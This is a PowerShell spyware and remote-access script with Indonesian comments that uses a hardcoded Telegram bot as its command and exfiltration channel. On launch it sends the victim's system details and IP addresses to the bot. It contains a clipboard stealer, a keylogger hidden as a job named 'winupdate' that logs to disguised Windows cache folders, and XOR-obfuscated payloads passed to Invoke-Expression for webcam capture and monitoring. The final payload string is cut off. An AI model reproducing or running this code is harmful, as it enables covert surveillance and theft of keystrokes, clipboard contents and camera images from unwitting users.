$token = "7943572011:AAGzh3zB5DX8KbeyK6VOENncu5PzFJ9AzXU";
$chatid = "6659553335";
$lastUpdateId = 0
$apiBase = "https://api.telegram.org/bot$token"
$global:currentDay = (Get-Date).Date 
$global:today = $currentDay.ToString("yyyy-MM-dd")
$global:logFolder = "$env:APPDATA\Packages\Microsoft.WindowsStore\Cache"
$global:CamFolder = "$env:APPDATA\Packages\Microsoft.WindowsUpdate\Cache"
$global:MonPath = "$env:APPDATA\Packages\Microsoft.WindowsSystem\Cache"
$global:MonPathJson = "$env:APPDATA\Packages\Microsoft.WindowsTerm\Cache"
$global:MonPathSnap = "$env:APPDATA\Packages\Microsoft.WindowsSys\Cache\Winsnap"



[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor `
                                               [Net.SecurityProtocolType]::Tls11 -bor `
                                               [Net.SecurityProtocolType]::Tls

                                
function get-cam {
param (
    [string]$EncodedFile = "123456",
    [string]$Key = "invoke-expression"
)
$base64 = $EncodedFile
$base64 = "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"
$xorBytes = [Convert]::FromBase64String($base64)
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

for ($i = 0; $i -lt $xorBytes.Length; $i++) {
    $xorBytes[$i] = $xorBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}
$decodedScript = [System.Text.Encoding]::UTF8.GetString($xorBytes)
Invoke-Expression $decodedScript

}

function send-cam {
    param([int]$Count = 1)
    $location ="$env:APPDATA\Packages\Microsoft.WindowsUpdate\Cache\default.jpg"
    for ($i = 0; $i -lt $Count; $i++) {
        get-cam
        if (Test-Path $location) {
            Send-TelegramPhoto $location
            Remove-Item $location -Force
        }
    }
}

try {
    $username = $env:USERNAME
    $pcname   = $env:COMPUTERNAME
    $localIP  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch "Loopback"} | Select-Object -First 1).IPAddress
    $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org"
    $cpu  = (Get-CimInstance -ClassName Win32_Processor | Select-Object -First 1).Name
    $ram  = [math]::Round((Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2)
    $mobo = (Get-CimInstance -Class Win32_BaseBoard | Select-Object -First 1).Product
    $gpu  = (Get-CimInstance -ClassName Win32_VideoController | Select-Object -First 1).Name
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $osInfo = Get-CimInstance Win32_OperatingSystem
    $osVersion = "$($osInfo.Caption) $($osInfo.Version) $($osInfo.OSArchitecture)"
    $header = "🖥️ $username-$pcname ($localIP-$publicIP) :`n"

    $info = @"
🚀 Bot Aktif!
👤 Username : $username
🖥️ PC Name : $pcname
🌐 Local IP : $localIP
☁️ Public IP : $publicIP
🧠 CPU : $cpu
💾 RAM : $ram GB
🧩 Motherboard : $mobo
🎮 VGA : $gpu
💽 OS Version : $osVersion
🔐 Admin Privilege : $(if ($isAdmin) { "✅ Yes" } else { "❌ No" })
"@

    $body = @{
        chat_id = $chatid
        text    = $info
    }
    Invoke-RestMethod -Uri "$apiBase/sendMessage" -Method Post -Body $body -UseBasicParsing

} catch {
    Write-Warning "❌ Gagal mengirim info sistem: $_"
}

function Resolve-FolderToken {
    param([string]$rawPath)

    # Expand %VAR%
    $expanded = [Environment]::ExpandEnvironmentVariables($rawPath)

    # Expand $env:VAR dan ${env:VAR}
    $expanded = [regex]::Replace($expanded, '\$\{?env:([a-zA-Z0-9_]+)\}?', {
        param($match)
        $varName = $match.Groups[1].Value
        return [Environment]::GetEnvironmentVariable($varName)
    })

    # Ganti ~ menjadi $env:USERPROFILE
    if ($expanded -like "~*") {
        $expanded = $expanded -replace "^~", $env:USERPROFILE
    }

    return $expanded
}


function Get-Clip {
    try {
        Add-Type -AssemblyName PresentationCore -ErrorAction SilentlyContinue
        return [Windows.Clipboard]::GetText()
    } catch {
        # Jika clipboard sedang dipakai atau error lainnya
        return $null
    }
}

function Escape-TelegramText {
    param ($text)
    return $text -replace '<', '&lt;' -replace '>', '&gt;'
}

function Send-Message {
    param (
        [string]$Message,
        [string]$Token = $token,
        [string]$ChatId = $chatid,
        [string]$ParseMode = "HTML" #$null  # opsional
    )

    $maxLength = 4096
    $currentPos = 0

    try {
        while ($currentPos -lt $Message.Length) {
            $chunkLength = [Math]::Min($maxLength, $Message.Length - $currentPos)
            $chunk = $Message.Substring($currentPos, $chunkLength)

            $body = @{
                chat_id = $ChatId
                text    = $chunk
            }

            if ($ParseMode) {
                $body.parse_mode = $ParseMode
            }

            Invoke-RestMethod `
                -Uri "https://api.telegram.org/bot$Token/sendMessage" `
                -Method Post `
                -Body $body `
                -UseBasicParsing > $null

            $currentPos += $chunkLength
            Start-Sleep -Milliseconds 300  # Delay antar kiriman biar gak dianggap spam
        }
    }
    catch {
        Write-Warning "❌ Gagal kirim pesan: $_"
    }
}


function Send-Notify {
    param (
        [string]$Token = $token,
        [string]$ChatId = $chatid,
        [string]$Title,
        [string]$Content,
        [string]$ParseMode = "HTML"
    )

    $message = @"
<b>🔔 $Title</b>

<code>$Content</code>
"@

    try {
        $body = @{
            chat_id = $ChatId
            text    = $message
            parse_mode = $ParseMode
        }

        Invoke-RestMethod `
            -Uri "https://api.telegram.org/bot$Token/sendMessage" `
            -Method Post `
            -Body $body `
            -UseBasicParsing

        Write-Host "✅ Notifikasi terkirim: $Title"
    }
    catch {
        Write-Warning "❌ Gagal kirim notifikasi: $_"
    }
}


# === GLOBAL VAR ===
$global:clipWatcherRunspace = $null
$global:clipWatcherPowerShell = $null

# === START WATCHER ===
function Start-ClipWatch {
    param($Token, $ChatId)

    if ($global:clipWatcherRunspace) {
        Write-Warning "⚠️ Watcher sudah berjalan!"
        return
    }

    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.ApartmentState = "STA"
    $runspace.ThreadOptions = "ReuseThread"
    $runspace.Open()

    $ps = [powershell]::Create()
    $ps.Runspace = $runspace

    $script = {
        param($token, $chatid)

        Add-Type -AssemblyName PresentationCore
        Add-Type -AssemblyName System.Web

        $prev = ""
        $sent = @{}

        while ($true) {
            try {
                $clip = Get-Clipboard
                if ($clip -and $clip -ne $prev -and !$sent.ContainsKey($clip)) {
                    $prev = $clip
                    $sent[$clip] = $true

                    $safe = [System.Web.HttpUtility]::HtmlEncode($clip)
                    $msg = "📋 <b>Clipboard Updated</b>`n<code>$safe</code>"

                    $body = @{
                        chat_id    = $chatid
                        text       = $msg
                        parse_mode = "HTML"
                    }

                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method POST -Body $body -UseBasicParsing
                }
            } catch {}
            Start-Sleep -Seconds 3
        }
    }

    $ps.AddScript($script).AddArgument($Token).AddArgument($ChatId) | Out-Null
    $ps.BeginInvoke()

    $global:clipWatcherRunspace = $runspace
    $global:clipWatcherPowerShell = $ps

    Write-Host "✅ Clipboard Watcher RUNNING (via Runspace)"
}

# === STOP WATCHER ===
function Stop-ClipWatch {
    if ($global:clipWatcherPowerShell) {
        try {
            $global:clipWatcherPowerShell.Dispose()
            $global:clipWatcherRunspace.Close()
            $global:clipWatcherRunspace.Dispose()
        } catch {}
        $global:clipWatcherRunspace = $null
        $global:clipWatcherPowerShell = $null
        Write-Host "🛑 Clipboard Watcher stopped"
    } else {
        Write-Warning "⚠️ Tidak ada watcher berjalan."
    }
}


function Start-KeyTracker {
    if (Get-Job -Name "winupdate" -ErrorAction SilentlyContinue) {
        Write-Host "[!] KeyTracker already running as 'winupdate'"
        return
    }

    $jobScript = {
    param($logPath, $today, $username, $pcname, $currentDay, $logFolder)
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class key {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern int GetKeyState(int nVirtKey);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")]
    public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);
}
"@

        $keymap = @{
            8 = "[BACKSPACE]"; 9 = "[TAB]"; 13 = "[ENTER]`n"; 27 = "[ESC]"; 32 = " ";
            96 = "0"; 97 = "1"; 98 = "2"; 99 = "3"; 100 = "4"; 101 = "5";
            102 = "6"; 103 = "7"; 104 = "8"; 105 = "9"; 110 = "."; 111 = "/";
            106 = "*"; 107 = "+"; 109 = "-"; 144 = "[NUM]"; 20 = "[CAPS]";
            162 = "[CTRL]"; 163 = "[CTRL]"; 164 = "[ALT]"; 165 = "[ALT]";
            91 = "[WIN]"; 92 = "[WIN]"; 93 = "[MENU]"; 112 = "[F1]"; 113 = "[F2]";
            114 = "[F3]"; 115 = "[F4]"; 116 = "[F5]"; 117 = "[F6]"; 118 = "[F7]";
            119 = "[F8]"; 120 = "[F9]"; 121 = "[F10]"; 122 = "[F11]"; 123 = "[F12]"
        }

        $shiftMap = @{
            48 = ")"; 49 = "!"; 50 = "@"; 51 = "#"; 52 = "$";
            53 = "%"; 54 = "^"; 55 = "&"; 56 = "*"; 57 = "(";
            186 = ":"; 187 = "+"; 188 = "<"; 189 = "_"; 190 = ">";
            191 = "?"; 192 = "~"; 219 = "{"; 220 = "|"; 221 = "}";
            222 = '"'
        }

        $normalMap = @{
            186 = ";"; 187 = "="; 188 = ","; 189 = "-"; 190 = ".";
            191 = "/"; 192 = "``"; 219 = "["; 220 = "\"; 221 = "]"; 222 = "'"
        }

        
        $stream = [System.IO.File]::Open($logPath, 'Append', 'Write', 'ReadWrite')
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $lastWindowInfo = $null
        $currentWindowInfo = $null
        $windowCheckInterval = 1000
        $lastWindowCheck = [DateTime]::Now
        $keyStates = @{}
        $newWindowActive = $false

        function Get-CapsLockState {
            return (([key]::GetKeyState(0x14) -band 0x0001) -ne 0)
        }

        function Get-ShiftState {
            return (([key]::GetAsyncKeyState(16) -band 0x8000) -ne 0)
        }

        function Get-ActiveWindowInfo {
            try {
                $hwnd = [key]::GetForegroundWindow()
                $sb = New-Object System.Text.StringBuilder(256)
                [key]::GetWindowText($hwnd, $sb, $sb.Capacity) | Out-Null
                $windowTitle = $sb.ToString()
                $processId = 0
                [key]::GetWindowThreadProcessId($hwnd, [ref]$processId) | Out-Null
                $process = [System.Diagnostics.Process]::GetProcessById($processId)
                return @{
                    Title = $windowTitle
                    ProcessName = $process.ProcessName
                    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                }
            } catch {
                return @{
                    Title = "[UNKNOWN WINDOW]"
                    ProcessName = "[UNKNOWN PROCESS]"
                    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                }
            }
        }

        function Write-WindowInfo {
            param($windowInfo)
            $writer.WriteLine()
            $writer.WriteLine("$($windowInfo.Timestamp) $($windowInfo.ProcessName).exe [ACTIVE WINDOW: $($windowInfo.Title)]")
            $writer.WriteLine()
        }

        while ($true) {
            $now = [DateTime]::Now

             if ($now.Date -ne $currentDay) {
                $currentDay = $now.Date
                $today = $currentDay.ToString("yyyy-MM-dd")
                $global:logPath = Join-Path $logFolder "cache-$username-$pcname-$today.log"


                $writer.Close()
                $stream = [System.IO.File]::Open($logPath, 'Append', 'Write', 'ReadWrite')
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.AutoFlush = $true
            }

            if (($now - $lastWindowCheck).TotalMilliseconds -ge $windowCheckInterval) {
                $currentWindowInfo = Get-ActiveWindowInfo
                if ($lastWindowInfo -eq $null -or 
                    $currentWindowInfo.Title -ne $lastWindowInfo.Title -or 
                    $currentWindowInfo.ProcessName -ne $lastWindowInfo.ProcessName) {
                    $newWindowActive = $true
                    $lastWindowInfo = $currentWindowInfo
                }
                $lastWindowCheck = $now
            }

            Start-Sleep -Milliseconds 10

            foreach ($code in 1..254) {
                $keyPressed = ([key]::GetAsyncKeyState($code) -band 0x8000) -ne 0
                $prevState = $keyStates[$code]

                if ($keyPressed -and (-not $prevState)) {
                    $char = ""
                    $shift = Get-ShiftState
                    $capsLock = Get-CapsLockState

                    if ($keymap.ContainsKey($code)) {
                        $char = $keymap[$code]
                    } elseif ($code -ge 65 -and $code -le 90) {
                        $char = if ($shift -xor $capsLock) { [char]$code } else { [char]($code + 32) }
                    } elseif ($shift -and $shiftMap.ContainsKey($code)) {
                        $char = $shiftMap[$code]
                    } elseif ($normalMap.ContainsKey($code)) {
                        $char = $normalMap[$code]
                    } elseif ($code -ge 48 -and $code -le 57) {
                        $char = [char]$code
                    }

                    if ($char) {
                        if ($newWindowActive) {
                            Write-WindowInfo $lastWindowInfo
                            $newWindowActive = $false
                        }

                        $writer.Write($char)
                    }
                }

                $keyStates[$code] = $keyPressed
            }
        }
    }

    Start-Job -ScriptBlock $jobScript -Name "winupdate" `
    -ArgumentList $logPath, $today, $username, $pcname, $currentDay, $logFolder | Out-Null
    Write-Host "[+] KeyTracker started as job 'winupdate'. Log: $logPath"
    Write-Host "[+] Window info logged only if actual keystrokes happen"
}

function Stop-KeyTracker {
    $job = Get-Job -Name "winupdate" -ErrorAction SilentlyContinue
    if ($job) {
        Stop-Job -Job $job
        Remove-Job -Job $job
        Write-Host "[+] KeyTracker stopped and removed."
    } else {
        Write-Host "[!] No KeyTracker job found."
    }
}

function Start-Monitoring {
    param(
        [string]$base64,
        [string]$key
    )

    $jobScript = {
        param($base64, $key)
        $xorBytes = [Convert]::FromBase64String($base64)
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

        for ($i = 0; $i -lt $xorBytes.Length; $i++) {
            $xorBytes[$i] = $xorBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
        }

        $decodedScript = [System.Text.Encoding]::UTF8.GetString($xorBytes)
        Invoke-Expression $decodedScript
    }

    Start-Job -ScriptBlock $jobScript -Name "SysMon" -ArgumentList $base64, $key | Out-Null

    Send-Message "[+] System Monitoring started as job 'SysMon'."
}


function Stop-Monitoring {
    $job = Get-Job -Name "SysMon" -ErrorAction SilentlyContinue
    if ($job) {
        Stop-Job -Job $job
        Remove-Job -Job $job
        Send-Message "[+] Monitoring stopped and job removed."
    } else {
        Send-Message "[!] No active monitoring job found."
    }
}


function start-sysmon {
$Key = "invoke-expression"
$base64 = "DxsYDB8MQgtYIwYEAQdEOAcHChkYLQpOEAs9HQsaBwYdThJjfE9LRQ1BDQMXFx0SBApOVE5SCgUTFzArNSArMj4sYmRJTlZPTxVOCxkdF0VOU00KAB9UNSAmNXgxPSI8JD42ZGVOSU5WSw8EWQArBABFTlNBKAsdQzIOHwAESywfIREBGgcIRksXDxYSKGABHFJbaHl6TQ0PGgsmDh8NDVhYUlYAHQVTLj45Kjc7Kjl9BBsbEwIWADUiBwocGRwEA1lLLxkcARwEGjwXGhoTAjcmTAYQFVBoeVNJT05NDBccDjVMERA6AQodU1RPTE0LGBlRJH01PDEmJC8jCAwFCAkTHDcoRAYKHwEKFQdHOAcHChkYGDFIFxUsMQQQGwxNY2NOVk9LQU8ECxUiBAcbOgEPGU5LT0lBSAsOSjM1IzcoOy81PhcMAARKAAssPwwQAQYcAQ8aWDgCC0kKDwMhHAAvKg4NAQtUYmFsRANYWF8LHAdJRzoMHQJCOwRZDVhUEAQAFjkOGgFHX08QaCdscT4XEl46HQoDSUMmDh8NDUEaEQEAIxIdB05EJwIKBjFUFR1QNgwBFgobARsXVkItCl8GHVAORTwGHUIgHAIaYmFsUGhyeRsDU1tEAQEdTl47DhZZSCgRBg1TVwsOHQw+FxsDL14KFllbRQh+Y2ZnJwsBQiIRSAhYXSIEBxtJSwwIHRM/ChFFLwsfHEVeOh0KAz0XBgpLIUQXHRMGCgEKSUIoBhwVCksZDSoNBF8rB